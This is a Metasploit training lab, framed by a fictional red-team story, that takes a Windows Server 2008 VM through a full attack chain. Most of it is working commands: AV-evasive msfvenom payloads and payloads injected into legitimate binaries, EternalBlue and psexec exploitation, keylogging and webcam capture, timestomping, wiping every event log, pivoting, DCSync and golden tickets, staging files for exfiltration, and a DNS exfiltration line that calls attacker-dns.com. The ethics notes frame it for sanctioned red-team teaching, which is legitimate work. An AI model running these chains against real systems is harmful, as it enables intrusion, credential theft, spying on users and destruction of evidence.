# MSF-301-W — Gold Level: Windows
## Operation: Lazarus Protocol — Chapter 3
### *"Owning the Kingdom"*

---

> *4:17 AM. Austin. The RedPhantom team is gathered around two folding tables and too*
> *many monitors. Empty coffee cups. A whiteboard covered in network diagrams and red*
> *arrows. Jake "Phantom" Williams pulls up a chair, cracks his knuckles, and grins.*
>
> *"Alright. We've been in their Windows box since yesterday morning. Zara's got hashes.*
> *Grim's got three persistence mechanisms stacked. Now we go deep. Custom payloads,*
> *no default signatures. We pivot past the management VLAN. We hit the domain controller.*
> *And we walk out clean. No logs, no artifacts, nothing Ghost Circuit could have left*
> *that we can't demonstrate."*
>
> *He pulls up a terminal. Types one command:*
>
> `msfvenom --list formats`
>
> *"Let's build something."*

---

## Objectives

By the end of this lab you will be able to:

1. Generate **custom payloads** with `msfvenom` (executables, DLLs, encoded variants)
2. Use **encoders and shikata_ga_nai** to reduce AV signature detection
3. Deploy a **staged listener infrastructure** with `exploit/multi/handler`
4. Perform **advanced post-exploitation**: `timestomp`, `clearev`, screenshot/keylogging
5. Set up **complex pivot routes** using `autoroute` and SOCKS5 proxying
6. Use the **SOCKS proxy** to tunnel Nmap and other non-MSF tools through a pivot
7. Demonstrate a **simulated data exfiltration** chain
8. Write and execute **MSF Resource Scripts** (`.rc` files) to automate attack chains
9. Perform **domain escalation** via DCSync / kerberoasting concepts
10. Conduct proper **cleanup and log wiping** (for red team documentation purposes)

---

## Prerequisites

- Completed MSF-101-W (Bronze) and MSF-201-W (Silver)
- Comfortable with Meterpreter, post modules, and pivoting concepts
- Familiarity with Windows domain concepts (AD, domain controllers, Kerberos)

---

## Target

| Property           | Value                        |
|--------------------|------------------------------|
| Primary target     | Windows Server 2008 R2 SP1   |
| Primary target IP  | `192.168.56.103`             |
| Pivot target       | `10.0.2.0/24` (internal)     |
| Attacker IP        | `192.168.56.1`               |

---

## Background: Why Custom Payloads?

The default MSF payloads — especially `windows/meterpreter/reverse_tcp` — have known
signatures. Every major antivirus vendor has had these signatures since approximately
2010. In a modern enterprise with endpoint detection:

- A raw `meterpreter/reverse_tcp` will be **caught instantly** by Windows Defender
- EDR solutions flag the behavioral patterns of staged loaders
- Network-based DLP will catch unencrypted C2 traffic

This is why **payload customization** is a core red team skill. `msfvenom` lets you:
- Encode payloads to change their byte signature
- Embed payloads in legitimate executables
- Choose different communication protocols (HTTPS, HTTP, reverse_tcp over DNS)
- Generate payloads for different target architectures

> **Ethics checkpoint:** These techniques are used by both red teams and malware authors.
> Your job in a red team context is to test whether the *client's* defenses would detect
> these. Document what worked and what didn't so they can improve their defenses.
> This is the entire value of the purple team philosophy.

---

## Phase 0 — Infrastructure Setup

### 0.1 — Start MSF Database and Workspace

```bash
sudo service postgresql start
msfconsole -q

msf6 > workspace -a msf301-windows
msf6 > workspace
# * msf301-windows
```

### 0.2 — Re-establish Initial Access

If starting fresh, re-exploit EternalBlue (Bronze level) to get a base session:

```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.56.103
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.56.1
msf6 exploit(ms17_010_eternalblue) > run

# Background the session
meterpreter > background
```

---

## Phase 1 — msfvenom: Custom Payload Generation

### 1.1 — Explore msfvenom

```bash
# Exit msfconsole temporarily, or open a second terminal
msfvenom --help
msfvenom --list payloads | grep windows
msfvenom --list encoders
msfvenom --list formats
```

### 1.2 — Generate a Basic Windows Executable

```bash
# Basic reverse TCP Meterpreter — no encoding (for baseline testing)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.56.1 \
  LPORT=9001 \
  -f exe \
  -o /tmp/payload_basic.exe
```

### 1.3 — Generate an Encoded Payload (Shikata Ga Nai)

`shikata_ga_nai` ("nothing can be done about it" in Japanese) is a polymorphic
XOR additive feedback encoder — the most used encoder in MSF:

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.56.1 \
  LPORT=9001 \
  -e x86/shikata_ga_nai \
  -i 10 \
  -f exe \
  -o /tmp/payload_encoded.exe
```

- `-e x86/shikata_ga_nai` — encoder
- `-i 10` — 10 encoding iterations (more iterations = more obfuscation)

> **Note:** shikata_ga_nai is well-known and still detected by modern AV. The point of
> this exercise is to understand the encoding concept. Real evasion today requires custom
> shellcode loaders, AMSI bypasses, and process injection — beyond MSF alone.

### 1.4 — Embed Payload in a Legitimate Executable

MSF can inject a payload into an existing Windows executable:

```bash
# Use a legitimate Windows binary as a template
# First, download notepad.exe from the target or use any benign .exe
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.56.1 \
  LPORT=9001 \
  -x /usr/share/windows-binaries/plink.exe \
  -k \
  -f exe \
  -o /tmp/payload_injected.exe
```

- `-x <template>` — use this binary as a template
- `-k` — keep the template's original behavior (so it looks legitimate)

### 1.5 — Generate Different Payload Formats

```bash
# DLL payload (for DLL hijacking or sideloading)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.56.1 LPORT=9002 \
  -f dll -o /tmp/evil.dll

# VBScript payload (macros, email attachments)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.56.1 LPORT=9003 \
  -f vba-exe -o /tmp/evil.vbs

# PowerShell payload (fileless / LOL-bins)
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=192.168.56.1 LPORT=443 \
  -f psh-reflection -o /tmp/payload.ps1

# HTA (HTML Application — classic phishing vector)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.56.1 LPORT=9004 \
  -f hta-psh -o /tmp/evil.hta
```

> **Discussion:** The PowerShell and HTA formats represent **fileless** attack vectors —
> they execute in memory and don't write a traditional `.exe` to disk. This bypasses
> many AV solutions that scan the file system but not memory. Ghost Circuit's tooling
> was largely fileless. This is why memory forensics and EDR behavioral detection are
> essential for modern blue teams.

### 1.6 — Use HTTPS for Encrypted C2 Communication

```bash
# Generate HTTPS reverse Meterpreter (C2 traffic blends with web traffic)
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=192.168.56.1 \
  LPORT=443 \
  -f exe \
  -o /tmp/payload_https.exe

# Set up the matching handler in msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(handler) > set PAYLOAD windows/x64/meterpreter/reverse_https
msf6 exploit(handler) > set LHOST 192.168.56.1
msf6 exploit(handler) > set LPORT 443
msf6 exploit(handler) > set ReverseListenerComm /  # Looks like normal HTTPS
msf6 exploit(handler) > run -j
```

> Using port 443 with HTTPS means C2 traffic looks like normal web browsing. Network
> firewalls that allow outbound HTTPS (almost all of them) will pass this traffic.
> This is a primary reason why modern firewalls need TLS inspection capabilities —
> though that creates its own privacy and performance trade-offs.

### 1.7 — Deliver the Payload to the Target

```bash
# Use your existing Meterpreter session to upload the payload
msf6 > sessions -i 1
meterpreter > upload /tmp/payload_https.exe C:\\Windows\\Temp\\svcupdate.exe

# Execute it (triggers a callback to your HTTPS handler)
meterpreter > shell
C:\> C:\Windows\Temp\svcupdate.exe
C:\> exit
```

Check for a new session in the handler:
```bash
msf6 > sessions
# You should now have Session 1 (original EternalBlue) AND Session 2 (custom payload)
```

---

## Phase 2 — Advanced Post-Exploitation

### 2.1 — Keylogging

```bash
msf6 > sessions -i 2    # Use the custom payload session

# Start keylogger
meterpreter > keyscan_start

# Wait 30-60 seconds (or simulate some keystrokes)
# Dump captured keystrokes
meterpreter > keyscan_dump

# Stop keylogging
meterpreter > keyscan_stop
```

### 2.2 — Screenshot and Webcam

```bash
meterpreter > screenshot                    # Grab desktop screenshot
meterpreter > screenshare                   # Live desktop stream (exits with Ctrl+C)
meterpreter > webcam_list                   # List webcams
meterpreter > webcam_snap                   # Take webcam photo
```

> This is why physical access to machines and "locking your screen" matters. An attacker
> with a remote session can see exactly what you see. Ghost Circuit's operators were
> watching Nexus Dynamics employees work — in real time.

### 2.3 — File System Search and Exfiltration Simulation

```bash
meterpreter > search -f "*.pdf" -d C:\\Users
meterpreter > search -f "password*" -d C:\\
meterpreter > search -f "*.xlsx" -d C:\\Users\\vagrant

# Simulate exfiltration — download interesting files
meterpreter > download C:\\Users\\vagrant\\Documents\\*.txt /tmp/exfil/
meterpreter > download C:\\inetpub\\wwwroot\\web.config /tmp/exfil/web.config
```

> In a real engagement, you would note the *path and type* of sensitive files found,
> but you would NOT actually exfiltrate real data without explicit scope authorization.
> **Always document findings in place; exfiltrate only test artifacts unless authorized.**

### 2.4 — Timestomping (Artifact Manipulation)

Timestomping changes file metadata timestamps to confuse forensic timelines.
Ghost Circuit used this to hide their malware's creation date.

```bash
# Check current timestamp of our payload
meterpreter > shell
C:\> dir /T:W C:\Windows\Temp\svcupdate.exe   # write time
C:\> exit

# Timestomp to match a legitimate Windows system file's date
meterpreter > timestomp C:\\Windows\\Temp\\svcupdate.exe -f C:\\Windows\\System32\\notepad.exe
meterpreter > timestomp C:\\Windows\\Temp\\svcupdate.exe -v    # verify change
```

### 2.5 — Event Log Manipulation

```bash
# View available logs
meterpreter > shell
C:\> wevtutil el             # List event logs
C:\> wevtutil qe Security /c:10 /rd:true /f:text   # Last 10 security events
C:\> exit

# Clear event logs using MSF post module
meterpreter > background

msf6 > use post/windows/manage/event_manager
msf6 post(event_manager) > set SESSION 2
msf6 post(event_manager) > set EVENTLOG Security
msf6 post(event_manager) > set ACTION CLEAR
msf6 post(event_manager) > run

# Clear all event logs at once via wevtutil in a shell
msf6 > sessions -i 2
meterpreter > shell
C:\> for /F "tokens=*" %1 in ('wevtutil.exe el') do wevtutil.exe cl "%1"
C:\> exit
```

> **Important ethical note:** Log clearing is a **legally significant action** in real
> engagements. It can constitute obstruction of justice or evidence tampering in some
> jurisdictions. **In a penetration test, you document that you *could* clear logs, but
> you do NOT clear them on production systems** without explicit written authorization.
> This lab's VM is your authorized sandbox — hence it's safe here.

---

## Phase 3 — Advanced Pivoting and Lateral Movement

### 3.1 — Autoroute: Routing Through the Session

```bash
# Return to msfconsole
meterpreter > background

# Set up routing through Session 1 (or 2) to the internal network
msf6 > use post/multi/manage/autoroute
msf6 post(autoroute) > set SESSION 1
msf6 post(autoroute) > set CMD add
msf6 post(autoroute) > set SUBNET 10.0.2.0
msf6 post(autoroute) > set NETMASK 255.255.255.0
msf6 post(autoroute) > run

msf6 > route print
# 10.0.2.0/24 via Session 1
```

### 3.2 — SOCKS5 Proxy (Tunneling Non-MSF Tools)

MSF can expose a SOCKS proxy that routes arbitrary TCP traffic through a Meterpreter
session. This means you can use **any tool** (not just MSF) through your pivot.

```bash
# Start a SOCKS5 proxy server in MSF
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(socks_proxy) > set SRVPORT 1080
msf6 auxiliary(socks_proxy) > set VERSION 5
msf6 auxiliary(socks_proxy) > run -j

# Verify it's running
msf6 > jobs
```

### 3.3 — Configure proxychains

```bash
# Edit proxychains config (outside msfconsole, in a separate terminal)
sudo nano /etc/proxychains4.conf
# At the bottom, ensure:
# socks5 127.0.0.1 1080

# Test: route nmap through the SOCKS proxy via the compromised Windows host
proxychains nmap -sT -Pn -p 445,3389,80 10.0.2.1
```

Now your Nmap traffic flows: `Your terminal → SOCKS proxy (port 1080) → MSF routing → Meterpreter session → Internal network target`

The internal targets never see your `192.168.56.1` address. They see traffic from the
compromised Windows Server.

### 3.4 — Double Pivot (Pivoting Through Multiple Hops)

```bash
# Scenario: You're in 192.168.56.103. It has access to 10.0.2.0/24.
# A machine on 10.0.2.0/24 has access to 172.16.0.0/24.
# You need to reach 172.16.0.0/24.

# Step 1: Use psexec through the first pivot to compromise 10.0.2.X
msf6 > use exploit/windows/smb/psexec
msf6 exploit(psexec) > set RHOSTS 10.0.2.X    # Routes through Session 1
msf6 exploit(psexec) > set SMBUser Administrator
msf6 exploit(psexec) > set SMBPass <hash>
msf6 exploit(psexec) > set LHOST 192.168.56.103   # Callback to the pivot host's IP
msf6 exploit(psexec) > set LPORT 8888
msf6 exploit(psexec) > run

# Step 2: Add the second-hop route through Session 3 (the 10.0.2.X machine)
msf6 > post/multi/manage/autoroute SESSION=3 CMD=add SUBNET=172.16.0.0 NETMASK=255.255.0.0

# Step 3: Now you can reach 172.16.0.0/24 through two hops
proxychains nmap -sT -Pn 172.16.0.1
```

---

## Phase 4 — Domain Compromise (Kerberoasting & DCSync)

### 4.1 — Kerberoasting (Concept + MSF)

Kerberoasting attacks **Kerberos TGS tickets** for service accounts. Service accounts
have SPNs (Service Principal Names). When you request a TGS ticket for an SPN, you get
a ticket encrypted with the **service account's password hash**. You can crack it offline.

```bash
msf6 > sessions -i 1

# Enumerate SPNs using MSF
msf6 > use auxiliary/gather/get_user_spns
msf6 auxiliary(get_user_spns) > set SESSION 1
msf6 auxiliary(get_user_spns) > run

# Alternatively, from a Meterpreter shell:
meterpreter > shell
C:\> setspn -Q */* 2>&1 | findstr /i "CN="   # List all SPNs
C:\> exit
```

```bash
# Request TGS tickets for found SPNs
meterpreter > load kiwi
meterpreter > kerberos_ticket_list          # List current tickets
meterpreter > golden_ticket_create ...      # Create golden ticket (see below)
```

### 4.2 — DCSync Attack (Simulated)

DCSync impersonates a Domain Controller replication request to pull password hashes
for any domain user — including `krbtgt` (the Kerberos TGT signing key).

```bash
# Requires Domain Admin or replication rights
meterpreter > load kiwi
meterpreter > dcsync_ntlm krbtgt           # Dump krbtgt hash (domain's master key)
meterpreter > dcsync_ntlm Administrator   # Dump Domain Admin NTLM hash
```

With the `krbtgt` hash you can create **Golden Tickets** — Kerberos authentication
tickets valid for any account, for any resource, for up to 10 years, that work even
after the target account's password changes.

```bash
# Create a Golden Ticket (requires: domain SID + krbtgt hash)
meterpreter > golden_ticket_create \
  -d NEXUSDYNAMICS.LOCAL \
  -k <krbtgt_NTLM_hash> \
  -s <domain_SID> \
  -u FakeAdminUser \
  -t /tmp/golden.kirbi

# Inject the golden ticket into the current session
meterpreter > kerberos_ticket_use /tmp/golden.kirbi

# Now authenticate to ANY domain resource as the fake admin
meterpreter > shell
C:\> dir \\dc01.nexusdynamics.local\C$   # Access DC's C drive
```

> **This is "owning the kingdom."** With a Golden Ticket, Ghost Circuit would have
> persistent, stealthy access to the entire domain — even after the initial exploit
> was patched, even after passwords were changed. The only remediation is to change
> the `krbtgt` password **twice** (to invalidate all existing Kerberos tickets) and
> rebuild compromised systems from scratch.

---

## Phase 5 — MSF Resource Scripts (Attack Automation)

Resource scripts let you automate entire attack chains. In a real engagement,
you'd script your reconnaissance and exploitation phases so they're reproducible
and peer-reviewable.

### 5.1 — Write an RC Script

```bash
# Create the resource script
cat > /tmp/nexus_recon.rc << 'EOF'
# Operation: Lazarus Protocol — Automated Recon
# Target: 192.168.56.103

workspace -a lazarus-auto

# Recon phase
db_nmap -sV -sC -p- --open 192.168.56.103

# Check EternalBlue
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.56.103
run

# Check Tomcat creds
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS 192.168.56.103
set RPORT 8080
run

# Print findings
hosts
services
vulns

EOF
```

```bash
# Execute the resource script
msfconsole -r /tmp/nexus_recon.rc
```

### 5.2 — Full Exploitation RC Script

```bash
cat > /tmp/nexus_exploit.rc << 'EOF'
# Phase 2: Exploitation chain
workspace lazarus-auto

# EternalBlue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.56.103
set LHOST 192.168.56.1
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit -j

# Wait for session
sleep 5

# Post-exploitation
use post/windows/gather/smart_hashdump
set SESSION 1
run

use post/multi/recon/local_exploit_suggester
set SESSION 1
run

# Dump credentials
sessions -i 1
use kiwi
creds_all

EOF
msfconsole -r /tmp/nexus_exploit.rc
```

---

## Phase 6 — Simulated Data Exfiltration Chain

### 6.1 — Stage Data on the Target

```bash
msf6 > sessions -i 2

meterpreter > shell

# Simulate finding and staging sensitive data
C:\> mkdir C:\Windows\Temp\staging
C:\> copy C:\Users\vagrant\Desktop\*.* C:\Windows\Temp\staging\
C:\> copy C:\inetpub\wwwroot\*.config C:\Windows\Temp\staging\

# Archive it (attackers often compress and encrypt before exfil)
C:\> powershell Compress-Archive -Path C:\Windows\Temp\staging -DestinationPath C:\Windows\Temp\data.zip
C:\> exit
```

### 6.2 — Exfiltrate via Meterpreter

```bash
meterpreter > download C:\\Windows\\Temp\\data.zip /tmp/exfil_data.zip
```

### 6.3 — Alternative Exfil: DNS Tunneling Concept

Real APTs often use DNS for exfiltration because outbound DNS is almost never blocked:

```bash
# MSF DNS exfiltration (for documentation/demonstration)
msf6 > use auxiliary/server/capture/dns
msf6 auxiliary(dns) > set SRVHOST 192.168.56.1
msf6 auxiliary(dns) > run -j

# On the target (demonstrates the concept):
meterpreter > shell
C:\> nslookup $(certutil -encodehex -f C:\Windows\System32\hostname.exe output.hex & cat output.hex).attacker-dns.com
```

> **Detection note:** DNS exfiltration produces abnormally long DNS queries and
> unusual subdomain patterns. Modern DNS monitoring (Zeek, DNS RPZ) can catch this.

---

## Phase 7 — Cleanup and Evidence of Compromise Report

### 7.1 — Systematic Cleanup Checklist

In a real engagement, after demonstrating access, you perform cleanup:

```bash
meterpreter > shell

# Remove uploaded files
C:\> del /f /q C:\Windows\Temp\svcupdate.exe
C:\> del /f /q C:\Windows\Temp\data.zip
C:\> rmdir /s /q C:\Windows\Temp\staging

# Remove registry persistence entries
C:\> reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "svcupdate" /f

# Clear event logs (document only — don't do on production)
C:\> wevtutil cl Security
C:\> wevtutil cl System
C:\> wevtutil cl Application
C:\> exit
```

### 7.2 — MSF Database Evidence Export

After an engagement, export your findings:

```bash
msf6 > workspace lazarus-auto

# Export all findings to HTML report
msf6 > db_export -f html /tmp/lazarus_report.html

# Or XML for tool import
msf6 > db_export -f xml /tmp/lazarus_data.xml

# Review summary
msf6 > hosts
msf6 > services
msf6 > vulns
msf6 > creds
msf6 > loot
```

---

## Deliverables

- [ ] **D1:** Screenshot of `msfvenom` generating encoded payload with 10 iterations
- [ ] **D2:** Evidence of HTTPS C2 session (screenshot showing HTTPS payload callback)
- [ ] **D3:** Screenshot of keylogger output (`keyscan_dump`)
- [ ] **D4:** Screenshot of SOCKS proxy setup and `proxychains nmap` output
- [ ] **D5:** Screenshot of `dcsync_ntlm` or `kiwi` golden ticket output
- [ ] **D6:** Your completed resource script (`.rc` file) for the recon phase
- [ ] **D7:** DB export — list of all discovered hosts, services, credentials, and loot
- [ ] **D8:** Answer the following discussion questions:

**Discussion Questions:**

1. You used `shikata_ga_nai` encoding to attempt AV evasion. Modern AV uses both
   **signature-based** and **behavioral/heuristic** detection. Which of the payloads
   you generated (encoded .exe, HTTPS, PowerShell reflection, HTA) would be hardest
   to detect with **behavioral analysis** alone, and why?

2. The Golden Ticket attack works because `krbtgt` credential compromise allows
   persistent domain access. What is the **full remediation procedure** for a domain
   that has had its `krbtgt` hash stolen? Why must it be done twice?

3. You cleared Windows Event Logs. A well-configured blue team would have **SIEM log
   forwarding** where logs are shipped to a central server in real-time. How does this
   change the attacker's position? What would an attacker need to do *differently* to
   avoid leaving evidence in a SIEM-monitored environment?

4. **Purple Team Reflection:** You've now completed the full attack chain from initial
   access to domain compromise. Write a 10-point prioritized remediation list for
   Nexus Dynamics. For each item, specify the attack it prevents and the effort/impact
   of the fix (Low/Medium/High for both).

---

## Cleanup

```bash
# Kill all sessions and jobs
msf6 > sessions -K
msf6 > jobs -K

# Revert VM snapshot
VBoxManage snapshot "metasploitable3-win2k8" restore "clean-state"
```

---

## Epilogue: The Debrief

> *9:22 AM. Grim slides a bound report across the conference table to David Park.*
> *"Operation: Lazarus Protocol. 47 pages. Every door, every window, every path.*
> *From the first EternalBlue shell to domain admin took us 6 hours and 43 minutes.*
> *Ghost Circuit had three months. They were thorough."*
>
> *Park turns to page 3. The prioritized findings list. His face tightens.*
>
> *"How many of these could have been fixed with a patch?"*
>
> *"Eleven," says Zara without looking up from her laptop.*
>
> *"An update Tuesday," Jake adds. "That's all it would have taken."*
>
> *Park closes the report. "Build me the defenses."*
>
> *Grim nods slowly. "That's what we do next."*

---

The best hackers don't just break things. They explain *exactly* how, and *exactly*
how to fix it. That's what separates a red team from an attacker. That's what separates
you from Ghost Circuit.

**Welcome to the Purple Team.**

---

## Reference

| Tool / Module | Purpose |
|---------------|---------|
| `msfvenom` | Custom payload generation |
| `exploit/multi/handler` | Staged payload listener |
| `post/windows/manage/event_manager` | Event log manipulation |
| `post/multi/manage/autoroute` | Add network pivot routes |
| `auxiliary/server/socks_proxy` | SOCKS5 tunnel for non-MSF tools |
| `proxychains` | Route arbitrary tools through SOCKS proxy |
| `exploit/windows/smb/psexec` | Remote execution / Pass-the-Hash |
| `auxiliary/gather/get_user_spns` | Kerberoasting — SPN enumeration |
| `kiwi` (Meterpreter) | Mimikatz — credential extraction, Golden Tickets, DCSync |
| `db_export` | Export MSF database to HTML/XML report |
| `msfconsole -r <file.rc>` | Execute resource script |

---

## Further Reading

- MITRE ATT&CK Framework: https://attack.mitre.org — Map every technique you used to
  a real-world TTP. This is the industry standard for documenting attacker behavior.
- Metasploit Unleashed (OffSec): Free, comprehensive MSF course
- The Hacker Playbook series — real red team methodology
- BloodHound / SharpHound — AD attack path visualization (post-Gold level)
- Covenant, Cobalt Strike, Havoc — commercial/open-source C2 frameworks (used in
  real red team engagements, next step after mastering MSF)
